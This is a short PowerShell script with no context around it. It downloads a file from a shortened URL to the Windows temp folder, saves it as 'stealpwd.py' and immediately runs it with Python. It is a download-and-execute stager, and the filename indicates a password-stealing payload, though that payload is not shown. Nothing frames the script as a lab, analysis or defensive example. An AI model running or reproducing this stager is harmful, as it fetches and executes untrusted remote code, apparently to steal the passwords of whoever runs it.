$WebClient = New-Object System.Net.WebClient
$WebClient.DownloadFile("https://rebrand.ly/iab05iw", "$env:temp\stealpwd.py")
python3 "$env:temp\stealpwd.py"
